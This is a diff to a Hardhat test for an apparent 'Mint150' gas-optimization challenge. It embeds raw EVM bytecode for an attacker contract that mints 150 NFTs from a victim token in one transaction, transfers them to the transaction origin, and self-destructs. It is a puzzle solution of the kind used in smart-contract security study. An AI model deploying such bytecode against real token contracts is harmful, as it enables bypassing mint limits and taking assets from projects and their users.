@@ -37,6 +37,27 @@ describe("Mint150", async function () {
     let attacker;
     let victimToken;
 
+    let OptimizedAttacker_abi = [
+        {
+            "inputs": [
+                {
+                    "internalType": "uint256",
+                    "name": "victim",
+                    "type": "uint256"
+                },
+                {
+                    "internalType": "uint256",
+                    "name": "tokenOffset",
+                    "type": "uint256"
+                }
+            ],
+            "stateMutability": "payable",
+            "type": "constructor"
+        }
+    ]
+
+    let OptimizedAttacker_bc = "60408038033d396020513d51631249c58b60e01b3d523060046323b872dd60e01b60965b3d3d843d3d895af19003806100235752523260245260446064836096015b8083523d3d833d3d885af190038085106100415732ff60008060613d393df3"
+
     beforeEach(async () => {
         await ethers.provider.send("hardhat_reset");
 
@@ -56,13 +77,16 @@ describe("Mint150", async function () {
 
     describe("Gas target", function () {
         it("The functions MUST meet the expected gas efficiency", async function () {
-            const attackerContract = await ethers.getContractFactory(
-                "OptimizedAttacker"
-            );
+            // const attackerContract = await ethers.getContractFactory(
+            //     "OptimizedAttacker"
+            // );
+            
+            const tokenOffset = await ethers.provider.getStorageAt(victimToken.address, 7); // 7 - totalSupplySlot
+            const attackerContract = await ethers.getContractFactory( OptimizedAttacker_abi,OptimizedAttacker_bc );
 
             const txn = await attackerContract
                 .connect(attacker)
-                .deploy(victimToken.address);
+                .deploy(victimToken.address,parseInt(tokenOffset,16));
 
             const receipt = await txn.deployTransaction.wait();
             const gasUsed = receipt.cumulativeGasUsed;
@@ -77,13 +101,16 @@ describe("Mint150", async function () {
 
     describe("Business logic", function () {
         it("The attacker MUST mint 150 NFTs in one transaction", async function () {
-            const attackerContract = await ethers.getContractFactory(
-                "OptimizedAttacker"
-            );
+            // const attackerContract = await ethers.getContractFactory(
+            //     "OptimizedAttacker"
+            // );
+
+            const tokenOffset = await ethers.provider.getStorageAt(victimToken.address, 7); // 7 - totalSupplySlot
+            const attackerContract = await ethers.getContractFactory( OptimizedAttacker_abi,OptimizedAttacker_bc );
 
             const txn = await attackerContract
                 .connect(attacker)
-                .deploy(victimToken.address);
+                .deploy(victimToken.address,parseInt(tokenOffset,16));
         });
     });
 
